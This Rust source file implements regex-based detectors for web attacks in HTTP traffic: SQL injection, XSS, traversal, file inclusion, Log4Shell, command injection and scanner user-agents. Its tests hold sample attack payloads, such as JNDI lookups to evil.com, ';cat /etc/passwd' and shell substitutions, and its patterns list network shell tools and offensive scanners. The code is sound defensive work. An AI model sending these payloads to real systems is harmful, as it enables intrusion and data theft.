//! Heuristic detectors: regex-based pattern matching for common attacks.
//!
//! Each heuristic implements [`Heuristic`] and returns zero or more [`Signal`]s
//! for an event. Heuristics are fast (microseconds) and run on every event
//! that passes the rules engine. They never do network I/O.
//!
//! Performance (F5): a single Aho-Corasick automaton over literal trigger
//! tokens gates the regexes — a family's regex can only match if one of its
//! literals is present in the scanned text, so on clean traffic the engine
//! runs one SIMD-vectorized scan and skips all eight text regexes. The
//! URL-decoded path/query are computed once per event and shared.

use std::sync::LazyLock;

use aho_corasick::AhoCorasick;
use regex::Regex;

use crate::analysis::{Signal, SignalKind};
use crate::event::{Event, HttpData};

/// A heuristic detector.
pub trait Heuristic: Send + Sync {
    /// Stable name for logging/metrics.
    fn name(&self) -> &'static str;

    /// Prefilter gate bit (F5): the engine runs this detector only when the
    /// automaton found one of the family's trigger literals. `None` = always
    /// run (no text scan involved).
    fn gate_bit(&self) -> Option<u8> {
        None
    }

    /// Analyze an event, returning signals it detected.
    ///
    /// `text` carries the URL-decoded path/query (empty for non-HTTP events),
    /// computed once per event by the engine.
    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal>;
}

/// URL-decoded path and query, shared by all text detectors (F5).
#[derive(Default)]
pub struct DecodedHttp {
    /// Percent-decoded request path (`%27` → `'`, `+`/`%20` → space).
    pub path: String,
    /// Percent-decoded query string; empty when the event has no query.
    pub query: String,
}

impl DecodedHttp {
    fn of(http: &HttpData) -> Self {
        let (path, query) = http_text(http);
        Self { path, query }
    }
}

/// Prefilter gate bits, one per text-scanning detector family.
pub mod gate {
    /// SQL injection family.
    pub const SQLI: u8 = 1 << 0;
    /// Cross-site scripting family.
    pub const XSS: u8 = 1 << 1;
    /// Path traversal family.
    pub const TRAVERSAL: u8 = 1 << 2;
    /// Local file inclusion family.
    pub const LFI: u8 = 1 << 3;
    /// Log4Shell JNDI lookup family.
    pub const LOG4SHELL: u8 = 1 << 4;
    /// Command injection family.
    pub const CMD: u8 = 1 << 5;
    /// Sensitive/administrative path family.
    pub const SENSITIVE: u8 = 1 << 6;
    /// Bad crawler User-Agent family.
    pub const CRAWLER: u8 = 1 << 7;
}

/// Literal triggers per family: every regex alternative contains at least one
/// of its family's literals (case-insensitive), so a family whose triggers
/// are absent from all scanned fields cannot match. Keep in sync with the
/// `*_RE` regexes below — `coverage` proptests enforce the invariant.
struct FamilyPrefilter {
    ac: AhoCorasick,
    /// Gate bit per automaton pattern, parallel to the pattern list.
    bits: Vec<u8>,
}

impl FamilyPrefilter {
    fn build() -> Self {
        const P: &[(&str, u8)] = &[
            // sqli — branch 1 needs a quote; the others their keyword.
            ("'", gate::SQLI),
            ("union", gate::SQLI),
            ("drop", gate::SQLI),
            ("'1'", gate::SQLI),
            ("1=1", gate::SQLI),
            ("information_schema", gate::SQLI),
            ("benchmark(", gate::SQLI),
            // xss — one literal per regex alternative.
            ("<script", gate::XSS),
            ("javascript:", gate::XSS),
            ("onerror", gate::XSS),
            ("onload", gate::XSS),
            ("onclick", gate::XSS),
            ("onmouseover", gate::XSS),
            ("<img", gate::XSS),
            ("<iframe", gate::XSS),
            ("<svg", gate::XSS),
            ("alert(", gate::XSS),
            ("document.cookie", gate::XSS),
            ("eval(", gate::XSS),
            // path traversal (decoded form).
            ("../", gate::TRAVERSAL),
            ("..\\", gate::TRAVERSAL),
            ("..%2f", gate::TRAVERSAL),
            ("..%5c", gate::TRAVERSAL),
            ("%2e%2e", gate::TRAVERSAL),
            ("..;/", gate::TRAVERSAL),
            ("..;\\", gate::TRAVERSAL),
            ("/etc/passwd", gate::TRAVERSAL),
            ("/proc/self", gate::TRAVERSAL),
            // lfi.
            ("/etc/", gate::LFI),
            ("/proc/self/", gate::LFI),
            ("/var/log/", gate::LFI),
            ("/boot/grub", gate::LFI),
            ("/windows/system32", gate::LFI),
            ("/win.ini", gate::LFI),
            ("c:\\windows", gate::LFI),
            ("file://", gate::LFI),
            ("php://", gate::LFI),
            ("expect://", gate::LFI),
            ("data://", gate::LFI),
            // log4shell.
            ("${jndi:", gate::LOG4SHELL),
            // command injection — one trigger per shell metachar branch.
            (";", gate::CMD),
            ("|", gate::CMD),
            ("`", gate::CMD),
            ("$(", gate::CMD),
            ("&&", gate::CMD),
            // bad crawler (regex is a pure literal alternation). Sensitive-path
            // literals are appended below from lists.rs (shared with the pack
            // rules) so the two can never drift.
            ("sqlmap", gate::CRAWLER),
            ("nikto", gate::CRAWLER),
            ("nmap", gate::CRAWLER),
            ("masscan", gate::CRAWLER),
            ("zgrab", gate::CRAWLER),
            ("nessus", gate::CRAWLER),
            ("acunetix", gate::CRAWLER),
            ("dirbuster", gate::CRAWLER),
            ("gobuster", gate::CRAWLER),
            ("wpscan", gate::CRAWLER),
            ("hydra", gate::CRAWLER),
            ("metasploit", gate::CRAWLER),
            ("burp", gate::CRAWLER),
            ("httrack", gate::CRAWLER),
            ("libwww", gate::CRAWLER),
            ("python-requests", gate::CRAWLER),
            ("curl/", gate::CRAWLER),
            ("go-http-client", gate::CRAWLER),
            ("scrapy", gate::CRAWLER),
            ("crawler4j", gate::CRAWLER),
            ("semrush", gate::CRAWLER),
            ("ahrefs", gate::CRAWLER),
            // curated scanner tools (nginx-ultimate-bad-bot-blocker).
            ("zmap", gate::CRAWLER),
            ("rustscan", gate::CRAWLER),
            ("unicornscan", gate::CRAWLER),
            ("nuclei", gate::CRAWLER),
            ("dirsearch", gate::CRAWLER),
            ("feroxbuster", gate::CRAWLER),
            ("ffuf", gate::CRAWLER),
            ("wfuzz", gate::CRAWLER),
            ("arachni", gate::CRAWLER),
            ("openvas", gate::CRAWLER),
            ("havij", gate::CRAWLER),
            ("commix", gate::CRAWLER),
            ("xsser", gate::CRAWLER),
            ("dalfox", gate::CRAWLER),
            ("gospider", gate::CRAWLER),
            ("hakrawler", gate::CRAWLER),
            ("webbandit", gate::CRAWLER),
            ("emailcollector", gate::CRAWLER),
        ];
        let mut patterns: Vec<(&str, u8)> = P.to_vec();
        patterns.extend(crate::lists::sensitive_path_literals().map(|lit| (lit, gate::SENSITIVE)));
        let ac = aho_corasick::AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            .build(patterns.iter().map(|(p, _)| *p))
            .expect("static patterns compile");
        Self {
            ac,
            bits: patterns.iter().map(|(_, b)| *b).collect(),
        }
    }

    /// Scan one text field, setting bits for families whose triggers appear.
    ///
    /// Overlapping iteration matters: triggers from different families can
    /// overlap (`/.` vs `../` in `/../etc`), and non-overlapping semantics
    /// would let the first-reported trigger starve the other families' bits.
    fn scan_into(&self, text: &str, mask: &mut u8) {
        for m in self.ac.find_overlapping_iter(text) {
            *mask |= self.bits[m.pattern().as_usize()];
        }
    }

    /// Whether any of a family's triggers appear in `text`.
    #[cfg(test)]
    fn family_hit(&self, bit: u8, text: &str) -> bool {
        self.ac
            .find_overlapping_iter(text)
            .any(|m| self.bits[m.pattern().as_usize()] & bit != 0)
    }
}

static PREFILTER: LazyLock<FamilyPrefilter> = LazyLock::new(FamilyPrefilter::build);

/// Composite heuristic that runs all registered detectors.
pub struct HeuristicEngine {
    detectors: Vec<Box<dyn Heuristic>>,
}

impl HeuristicEngine {
    /// Create a new engine with the default set of detectors.
    pub fn with_defaults() -> Self {
        Self {
            detectors: vec![
                Box::new(SqlInjection),
                Box::new(Xss),
                Box::new(PathTraversal),
                Box::new(Lfi),
                Box::new(Log4Shell),
                Box::new(CmdInjection),
                Box::new(SensitivePath),
                Box::new(BadCrawler),
                Box::new(EmptyUserAgent),
                Box::new(TcpScanner),
            ],
        }
    }

    /// Run all detectors and collect signals.
    ///
    /// Text families are gated by the shared Aho-Corasick prefilter: on a
    /// clean request none of their trigger literals appear and no regex runs.
    pub fn analyze(&self, evt: &Event) -> Vec<Signal> {
        let decoded = evt.http().map(DecodedHttp::of);
        let mut gates = 0u8;
        if let (Some(http), Some(text)) = (evt.http(), decoded.as_ref()) {
            PREFILTER.scan_into(&text.path, &mut gates);
            PREFILTER.scan_into(&text.query, &mut gates);
            if let Some(ua) = &http.user_agent {
                PREFILTER.scan_into(ua, &mut gates);
            }
            if let Some(referer) = &http.referer {
                PREFILTER.scan_into(referer, &mut gates);
            }
            for v in http.headers.values() {
                PREFILTER.scan_into(v, &mut gates);
            }
        }
        let empty = DecodedHttp::default();
        let text = decoded.as_ref().unwrap_or(&empty);
        let mut out = Vec::new();
        for d in &self.detectors {
            if let Some(bit) = d.gate_bit() {
                if gates & bit == 0 {
                    continue;
                }
            }
            out.extend(d.analyze(evt, text));
        }
        out
    }

    /// Run every detector unconditionally (no prefilter gating).
    ///
    /// Test-only: the equivalence tests assert that gating never changes
    /// the signal set.
    #[cfg(test)]
    fn analyze_ungated(&self, evt: &Event) -> Vec<Signal> {
        let decoded = evt.http().map(DecodedHttp::of);
        let empty = DecodedHttp::default();
        let text = decoded.as_ref().unwrap_or(&empty);
        self.detectors
            .iter()
            .flat_map(|d| d.analyze(evt, text))
            .collect()
    }
}

// ── Compiled regexes (LazyLock: auto-derefs to Regex) ────────────────────

/// Percent-decode a URL component and convert `+` to space.
///
/// Attackers routinely URL-encode payloads to bypass naive regex (`%27` for
/// `'`, `%20` or `+` for space). Heuristics run on the decoded form so the
/// patterns see the attacker's intent, not the transport encoding.
fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => {
                let hi = hex_val(bytes[i + 1]);
                let lo = hex_val(bytes[i + 2]);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h << 4) | l);
                    i += 3;
                } else {
                    out.push(bytes[i]);
                    i += 1;
                }
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Decode a hex digit to its numeric value.
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Decode both the path and the query of an HTTP event into a single
/// normalized string suitable for regex matching.
fn http_text(http: &HttpData) -> (String, String) {
    (
        url_decode(http.path.as_str()),
        http.query.as_deref().map(url_decode).unwrap_or_default(),
    )
}

static SQLI_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:'|"")(?:\s|--|/\*|#).*(?:or|union|select|insert|update|delete|drop|exec)\b|(?:union\s+select)|(?:;\s*drop)|(?:'\s+or\s+'1'|'1'\s*=\s*'1'|or\s+1=1)|(?:information_schema)|(?:benchmark\s*\()"#).unwrap()
});

static XSS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:<script|javascript:|onerror\s*=|onload\s*=|onclick\s*=|onmouseover\s*=|<img[^>]+src\s*=|<iframe|<svg/onload|alert\s*\(|document\.cookie|eval\s*\()").unwrap()
});

static PATH_TRAVERSAL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:\.\.[/\\]|\.\.%2f|\.\.%5c|%2e%2e[/\\]|%2e%2e%2f|%2e%2e%5c|\.\.;[/\\]|/etc/passwd|/proc/self)").unwrap()
});

static LFI_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:/etc/(?:passwd|shadow|hosts|group|nginx)|/proc/self/(?:environ|fd/|status|cmdline)|/var/log/[a-z]|/boot/grub|/windows/system32|/win\.ini|c:\\\\windows|file://|php://filter|php://input|expect://|data://)").unwrap()
});

static LOG4SHELL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\$\{jndi:(?:ldap|ldaps|rmi|dns|iiop|nis|nds|corba)").unwrap()
});

static CMD_INJECTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:;\s*(?:cat|ls|id|whoami|uname|wget|curl|bash|sh|nc|ncat)\b)|(?:\|\s*(?:cat|ls|id|whoami|uname|wget|curl|bash|sh|nc|ncat)\b)|(?:`[^`]+`)|(?:\$\([^)]+\))|(?:&&\s*(?:cat|ls|id|whoami))").unwrap()
});

static SENSITIVE_PATH_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&crate::lists::sensitive_paths_regex()).expect("sensitive path patterns compile")
});

static BAD_CRAWLER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(?:sqlmap|nikto|nmap|masscan|zgrab|zmap|rustscan|unicornscan|nessus|acunetix|dirbuster|dirsearch|gobuster|feroxbuster|ffuf|wfuzz|wpscan|hydra|metasploit|burp|httrack|libwww|python-requests|curl/[0-9]|go-http-client|scrapy|crawler4j|semrush|ahrefs|nuclei|arachni|openvas|havij|commix|xsser|dalfox|gospider|hakrawler|webbandit|emailcollector)").unwrap()
});

// ── Detectors ────────────────────────────────────────────────────────────

/// SQL injection patterns.
pub struct SqlInjection;
impl Heuristic for SqlInjection {
    fn name(&self) -> &'static str {
        "sqli"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::SQLI)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if SQLI_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::SqlInjection,
                    weight: 60,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// XSS patterns.
pub struct Xss;
impl Heuristic for Xss {
    fn name(&self) -> &'static str {
        "xss"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::XSS)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if XSS_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Xss,
                    weight: 45,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Path traversal.
pub struct PathTraversal;
impl Heuristic for PathTraversal {
    fn name(&self) -> &'static str {
        "path_traversal"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::TRAVERSAL)
    }
    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        if PATH_TRAVERSAL_RE.is_match(&text.path) || PATH_TRAVERSAL_RE.is_match(&text.query) {
            let path = evt.http().map(|h| h.path.clone()).unwrap_or_default();
            return vec![Signal {
                kind: SignalKind::PathTraversal,
                weight: 40,
                detail: Some(path),
            }];
        }
        vec![]
    }
}

/// Local file inclusion — attempts to read system files via path manipulation.
pub struct Lfi;
impl Heuristic for Lfi {
    fn name(&self) -> &'static str {
        "lfi"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::LFI)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if LFI_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Lfi,
                    weight: 50,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Log4Shell.
pub struct Log4Shell;
impl Heuristic for Log4Shell {
    fn name(&self) -> &'static str {
        "log4shell"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::LOG4SHELL)
    }
    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        for t in [
            text.path.as_str(),
            text.query.as_str(),
            http.user_agent.as_deref().unwrap_or(""),
            http.referer.as_deref().unwrap_or(""),
        ] {
            if LOG4SHELL_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Log4Shell,
                    weight: 80,
                    detail: Some(format!("matched: {t}")),
                }];
            }
        }
        for (k, v) in &http.headers {
            if LOG4SHELL_RE.is_match(v) {
                return vec![Signal {
                    kind: SignalKind::Log4Shell,
                    weight: 80,
                    detail: Some(format!("header {k}")),
                }];
            }
        }
        vec![]
    }
}

/// Command injection.
pub struct CmdInjection;
impl Heuristic for CmdInjection {
    fn name(&self) -> &'static str {
        "cmd_injection"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::CMD)
    }
    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
        for t in [text.path.as_str(), text.query.as_str()] {
            if CMD_INJECTION_RE.is_match(t) {
                return vec![Signal {
                    kind: SignalKind::Rce,
                    weight: 70,
                    detail: Some(format!("matched in: {t}")),
                }];
            }
        }
        vec![]
    }
}

/// Sensitive path access.
pub struct SensitivePath;
impl Heuristic for SensitivePath {
    fn name(&self) -> &'static str {
        "sensitive_path"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::SENSITIVE)
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        if SENSITIVE_PATH_RE.is_match(&http.path.to_ascii_lowercase()) {
            return vec![Signal {
                kind: SignalKind::SensitivePath,
                weight: 30,
                detail: Some(http.path.clone()),
            }];
        }
        vec![]
    }
}

/// Bad crawler User-Agent.
pub struct BadCrawler;
impl Heuristic for BadCrawler {
    fn name(&self) -> &'static str {
        "bad_crawler"
    }
    fn gate_bit(&self) -> Option<u8> {
        Some(gate::CRAWLER)
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        let ua = match &http.user_agent {
            Some(u) => u.to_ascii_lowercase(),
            None => return vec![],
        };
        if BAD_CRAWLER_RE.is_match(&ua) {
            return vec![Signal {
                kind: SignalKind::BadCrawler,
                weight: 40,
                detail: Some(http.user_agent.clone().unwrap_or_default()),
            }];
        }
        vec![]
    }
}

/// Empty User-Agent.
pub struct EmptyUserAgent;
impl Heuristic for EmptyUserAgent {
    fn name(&self) -> &'static str {
        "empty_ua"
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let http = match evt.http() {
            Some(h) => h,
            None => return vec![],
        };
        match &http.user_agent {
            None => vec![Signal {
                kind: SignalKind::SuspiciousUA,
                weight: 10,
                detail: Some("missing".into()),
            }],
            Some(ua) if ua.trim().is_empty() => vec![Signal {
                kind: SignalKind::SuspiciousUA,
                weight: 10,
                detail: Some("empty".into()),
            }],
            _ => vec![],
        }
    }
}

/// Passive TCP SYN fingerprint match (F3.2): flags captured SYNs whose
/// `window:options:MSS:wscale` code matches a known high-rate scanner
/// (masscan / zmap / nmap-style probes).
pub struct TcpScanner;
impl Heuristic for TcpScanner {
    fn name(&self) -> &'static str {
        "tcp_scanner"
    }
    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
        let code = match evt.tcp().and_then(|t| t.fingerprint.as_deref()) {
            Some(c) => c,
            None => return vec![],
        };
        match crate::tcpfp::scanner_name(code) {
            Some(tool) => vec![Signal {
                kind: SignalKind::TcpScanner,
                weight: 30,
                detail: Some(format!("{code} ({tool})")),
            }],
            None => vec![],
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{HttpData, ProtocolData, SourceKind};
    use std::net::Ipv4Addr;

    fn http_evt(path: &str, ua: Option<&str>) -> Event {
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: path.to_string(),
                user_agent: ua.map(String::from),
                ..Default::default()
            }),
        )
    }

    fn text_of(e: &Event) -> DecodedHttp {
        e.http().map(DecodedHttp::of).unwrap_or_default()
    }

    #[test]
    fn detects_sqli() {
        let e = http_evt("/login?user=admin'+OR+1=1--", None);
        let signals = SqlInjection.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::SqlInjection);
    }

    #[test]
    fn detects_xss() {
        let e = http_evt("/search?q=<script>alert(1)</script>", None);
        let signals = Xss.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::Xss);
    }

    #[test]
    fn detects_path_traversal() {
        let e = http_evt("/../../../etc/passwd", None);
        let signals = PathTraversal.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_lfi() {
        let e = http_evt("/page?file=/etc/shadow", None);
        let signals = Lfi.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::Lfi);
    }

    #[test]
    fn detects_lfi_php_filter() {
        let e = http_evt(
            "/?page=php://filter/convert.base64-encode/resource=index",
            None,
        );
        let signals = Lfi.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_log4shell() {
        let e = http_evt("/", Some("${jndi:ldap://evil.com/x}"));
        let signals = Log4Shell.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_sensitive_path() {
        let e = http_evt("/.env", None);
        let signals = SensitivePath.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_bad_crawler() {
        let e = http_evt("/", Some("sqlmap/1.0"));
        let signals = BadCrawler.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_empty_ua() {
        let e = http_evt("/", None);
        let signals = EmptyUserAgent.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn clean_request_no_signals() {
        let e = http_evt("/api/users?page=1", Some("Mozilla/5.0"));
        let engine = HeuristicEngine::with_defaults();
        let signals = engine.analyze(&e);
        assert!(signals.is_empty(), "expected no signals, got {signals:?}");
    }

    #[test]
    fn engine_runs_all_detectors() {
        let e = http_evt("/.env?q=<script>alert(1)</script>", Some("sqlmap/1.0"));
        let engine = HeuristicEngine::with_defaults();
        let signals = engine.analyze(&e);
        assert!(
            signals.len() >= 3,
            "expected at least 3 signals, got {signals:?}"
        );
    }
}

#[cfg(test)]
mod proptests {
    use super::*;
    use crate::event::{HttpData, ProtocolData, SourceKind};
    use proptest::prelude::*;

    fn http_evt(path: &str, ua: Option<&str>) -> Event {
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(std::net::Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: path.to_string(),
                user_agent: ua.map(String::from),
                ..Default::default()
            }),
        )
    }

    fn text_of(e: &Event) -> DecodedHttp {
        e.http().map(DecodedHttp::of).unwrap_or_default()
    }

    proptest! {
        #[test]
        fn proptest_sqli_union_select(payload in "(?i)union\\s+select") {
            let e = http_evt(&format!("/?id={payload}"), None);
            let signals = SqlInjection.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_sqli_or_1_1(sep in r#"['"]"#) {
            let payload = format!("{sep} OR 1=1--");
            let e = http_evt(&format!("/?id={payload}"), None);
            let signals = SqlInjection.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_xss_script_tag(inner in r#"[a-zA-Z0-9]{1,20}"#) {
            let payload = format!("/?q=<script>alert({inner})</script>");
            let e = http_evt(&payload, None);
            let signals = Xss.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_path_traversal_encoded(count in 1usize..=5) {
            let payload = "%2e%2e%2f".repeat(count);
            let e = http_evt(&format!("/{payload}"), None);
            let signals = PathTraversal.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_log4shell_jndi(host in r#"[a-z]{1,10}\.com"#) {
            let payload = format!("${{jndi:ldap://{host}/x}}");
            let e = http_evt("/", Some(&payload));
            let signals = Log4Shell.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_clean_request_no_sqli(
            path in r#"/api/[a-z]+/[0-9]+"#,
            q in r#"[a-z]=[a-z0-9]{1,20}"#
        ) {
            let full = format!("{path}?{q}");
            let e = http_evt(&full, Some("Mozilla/5.0"));
            let signals = SqlInjection.analyze(&e, &text_of(&e));
            prop_assert!(signals.is_empty(), "false positive on {full}");
        }
    }

    /// Gating must never change the signal set: for arbitrary request
    /// strings, the gated engine returns exactly what the ungated one does.
    #[test]
    fn engine_gating_equivalence_corpus() {
        let corpus = [
            "/api/users?page=1",
            "/",
            "/login?user=admin'+OR+1=1--",
            "/?id=1%20UNION%20SELECT%20password",
            "/search?q=<script>alert(1)</script>",
            "/?q=<img src=x onerror=alert(1)>",
            "/?x=javascript:void(0)",
            "/../../../etc/passwd",
            "/%2e%2e%2f%2e%2e%2fboot.ini",
            "/download?file=../../windows/system32/config",
            "/?page=php://filter/convert.base64-encode/resource=index",
            "/?f=file:///etc/shadow",
            "/x.jsp?i=${jndi:ldap://evil.com/a}",
            "/api?callback=${JNDI:rmi://x/y}",
            "/cmd?exec=;cat%20/etc/passwd",
            "/ping?host=1|whoami",
            "/run?c=`id`",
            "/api?x=$(uname%20-a)",
            "/a?b=1&&ls",
            "/.env",
            "/.git/config",
            "/wp-admin/setup.php",
            "/phpmyadmin/index.php",
            "/backup.sql",
            "/site.old",
            "/manager/html",
            "/actuator/env",
            "/server-status",
            "/_ignition/execute-solution",
            "/Autodiscover/Autodiscover.xml",
            "/mifs/.;/services/LogService",
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/HNAP1",
            "/remote/fgt_lang",
            "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
            "/RestAPI/LogonCustomization",
            "/Telerik.Web.UI.WebResource.axd",
            "/GponForm/diag_Form",
            "/wp-includes/js/jquery/jquery.php",
            "/adminer.php",
            "/",
            "/go_http_client",
            "/x?ua=python-requests/2.0",
            "/api/v2/health?check=ok&token=abc",
            "/static/main.css?v=123",
        ];
        let engine = HeuristicEngine::with_defaults();
        for path in corpus {
            let e = http_evt(path, Some("Mozilla/5.0 (compatible)"));
            let gated = engine.analyze(&e);
            let ungated = engine.analyze_ungated(&e);
            assert_eq!(
                gated.len(),
                ungated.len(),
                "gating changed the signal count on {path}: {gated:?} vs {ungated:?}"
            );
            for (g, u) in gated.iter().zip(ungated.iter()) {
                assert_eq!(g.kind, u.kind, "kind mismatch on {path}");
                assert_eq!(g.weight, u.weight, "weight mismatch on {path}");
            }
        }
    }

    /// Prefilter soundness: if a family's regex matches a field, the
    /// automaton must have found one of that family's triggers in it.
    /// Guards the trigger tables against drift from the `*_RE` regexes.
    #[test]
    fn prefilter_triggers_are_necessary_literals() {
        let samples = [
            "",
            "/",
            "abc",
            "' OR 1=1--",
            "1 UNION SELECT * FROM users",
            "x'; DROP TABLE users;--",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:document.cookie",
            "../../etc/passwd",
            "..%2f..%2fproc/self/environ",
            "%2e%2e%5cwin.ini",
            "file:///c:\\windows\\system32",
            "php://input",
            "data://text/plain",
            "expect://id",
            "${jndi:ldap://x}",
            "${JNDI:dns://y}",
            ";cat /etc/passwd",
            "|whoami",
            "`uname`",
            "$(id)",
            "&&ls",
            "/.env",
            "/.aws/credentials",
            "/wp-login.php",
            "/pma/",
            "/actuator/heapdump",
            "/backup.old",
            "/db.sql",
            "/manager/html",
            "/server-info",
            "/_ignition/execute-solution",
            "/autodiscover/autodiscover.xml",
            "/mifs/.;/services/LogService",
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/hnap1",
            "/remote/fgt_lang",
            "/ecp/current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
            "/restapi/logoncustomization",
            "/telerik.web.ui.webresource.axd",
            "/gponform/diag_form",
            "/wp-includes/js/jquery/jquery.php",
            "sqlmap/1.5",
            "Nmap Scripting Engine",
            "python-requests/2.31",
            "go-http-client/2.0",
            "Hydra v9",
            "masscan/1.3",
            "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
            "ffuf/2.1",
            "feroxbuster/2.10",
            "dirsearch/v0.4.3",
        ];
        let pf = &*PREFILTER;
        for t in samples {
            let check = |bit: u8, hit: bool, family: &str| {
                assert!(
                    !hit || pf.family_hit(bit, t),
                    "{family} regex matched {t:?} but no trigger literal was found"
                );
            };
            check(gate::SQLI, SQLI_RE.is_match(t), "sqli");
            check(gate::XSS, XSS_RE.is_match(t), "xss");
            check(gate::TRAVERSAL, PATH_TRAVERSAL_RE.is_match(t), "traversal");
            check(gate::LFI, LFI_RE.is_match(t), "lfi");
            check(gate::LOG4SHELL, LOG4SHELL_RE.is_match(t), "log4shell");
            check(gate::CMD, CMD_INJECTION_RE.is_match(t), "cmd");
            check(
                gate::SENSITIVE,
                SENSITIVE_PATH_RE.is_match(&t.to_ascii_lowercase()),
                "sensitive",
            );
            check(
                gate::CRAWLER,
                BAD_CRAWLER_RE.is_match(&t.to_ascii_lowercase()),
                "crawler",
            );
        }
    }
}
